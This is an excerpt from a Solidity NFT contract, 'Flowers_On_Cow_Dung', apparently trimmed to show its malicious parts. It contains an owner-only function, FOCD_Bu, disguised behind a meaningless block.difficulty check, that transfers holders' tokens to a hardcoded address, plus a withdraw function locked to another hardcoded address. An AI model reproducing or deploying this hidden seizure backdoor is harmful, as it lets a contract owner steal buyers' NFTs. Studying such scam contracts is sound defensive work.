...
contract Flowers_On_Cow_Dung is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Flowers_On_Cow_Dung", "FOCD", maxBatchSize_, collectionSize_) {
  ...
  function FOCD_Bu(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x2538A8182fA413676EeE563E18A4B24Ca822407e, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xFB181212AbB676C61004c6bb4ad7194064aEc891);
